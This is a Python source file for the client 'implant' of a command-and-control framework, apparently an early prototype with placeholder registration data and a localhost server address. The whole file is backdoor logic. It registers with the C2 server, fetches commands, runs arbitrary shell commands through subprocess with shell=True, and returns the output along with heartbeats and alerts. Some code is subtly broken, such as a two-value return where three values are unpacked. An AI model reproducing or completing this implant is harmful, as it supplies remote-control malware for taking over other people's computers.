import requests
import os
import subprocess
import hashlib


class Implant():
    def __init__(self, c2_addr):
        self.c2_addr = c2_addr
        self.implant_id = self._gen_id()
    
    def _gen_id(self):
        mac_addr = "00:00:00:00:00:00"
        return hashlib.sha256(mac_addr.encode('utf-8')).hexdigest()
    
    def register(self):
        data = {
            "computer_name": "dummyimplantcomputer",
            "computer_user": "some_user",  # (what user the implant is running as)
            "computer_GUID": "dummy_GUID",
            "computer_privileges": ["string1", "string2"],  # (that the implant has) - array of strings
            "connecting_ip_address": "10.10.10.10",  # (from the victim computer)
            "session_key": "dummy_session_key",  # (for crypto, eventually)
        }
        requests.post(os.path.join(self.c2_addr, "registerImplant"), json=data)

    def get_command(self):
        data = {
            "implant_id": self.implant_id,
        }
        r = requests.get(os.path.join(self.c2_addr, "getNextCommand"), json=data)
        res = r.text
        if not res:
            return None, None
        parts = res.split(",")
        command_id = parts[0]
        command_type = parts[1]
        command = ",".join(parts[2:])
        return command_id, command_type, command

    def run_shell(self, command):
        p = subprocess.run(command, shell=True, capture_output=True)
        return p.stdout

    def return_command(self, command_id, result):
        data = {
            "implant_id": self.implant_id,
            "command_id": command_id,
            "result": result,
        }
        requests.post(os.path.join(self.c2_addr, "sendCommandResult"), json=data)
    
    def get_command_and_run(self):
        command_id, command_type, command = self.get_command()
        if command is None:
            return
        if command_type=="shell":
            result = self.run_shell(command)
        elif command_type=="whoami":
            result = "i am an implant"
        self.return_command(command_id, result)
    
    def heartbeat(self):
        data = {
            "implant_id": self.implant_id,
            "still_active": True,
        }
        requests.post(os.path.join(self.c2_addr, "heartbeat"), json=data)
    
    def alert(self, message):
        data = {
            "implant_id": self.implant_id,
            "error": message,
        }
        requests.post(os.path.join(self.c2_addr, "alert"), json=data)


if __name__=="__main__":
    implant = Implant("http://localhost:5000")
